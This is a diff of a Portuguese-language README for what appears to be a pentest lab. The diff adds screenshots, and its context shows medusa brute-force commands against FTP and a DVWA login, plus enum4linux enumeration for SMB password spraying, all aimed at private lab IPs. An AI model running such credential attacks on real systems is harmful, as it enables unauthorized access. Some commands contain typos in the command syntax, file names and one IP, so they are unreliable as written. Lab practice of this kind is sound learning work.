@@ -15,9 +15,11 @@
 
 - users.txt
 - passwords.txt
+
   
+  <img width="528" height="364" alt="Captura de tela de 2026-11-06 14-55-52" src="https://github.com/user-attachments/assets/3f787c1d-2fd0-4ab5-9eaf-bf450263e836" />
+
 ```
-echo
 echo-e 'user\nmsfadmin\admin\nroot' > users.txt 
 ```
 ``` medusa -h 192.16.56.102 -U usaer.txt -P pass.txt -M ftp -t 6 ```
@@ -27,12 +29,23 @@ echo-e 'user\nmsfadmin\admin\nroot' > users.txt
 
 https://192.168.56.10/dvwa/login.php
 
+<img width="1721" height="874" alt="Captura de tela de 2026-11-06 14-37-32" src="https://github.com/user-attachments/assets/bcdde504-e0cf-450b-8d1e-b7b3dc5f35c7" />
+
+
+<img width="1343" height="919" alt="Captura de tela de 2026-11-06 15-31-59" src="https://github.com/user-attachments/assets/a21416c3-b35b-4e05-b49d-b3d522cef97a" />
+
+
 ## Password spraying em SMB com enumeração de usuários
 
 
 ```
 enum4linux -a 192.168.56.102 | tee enum_output.txt
 ```
+<img width="528" height="364" alt="Captura de tela de 2026-11-06 14-55-52" src="https://github.com/user-attachments/assets/e801f739-2d6c-4542-82f8-2a165fc6d4e0" />
+
+<img width="1345" height="945" alt="Captura de tela de 2026-11-06 16-46-21" src="https://github.com/user-attachments/assets/8347f748-8b88-497b-a22a-e3aa22b9f2e9" />
+
+
 ```
 medusa -h  192.168.56.102 -U users.txt -P pass.txt -M http \
 -m PAGE: '/dvwa/login.php' \
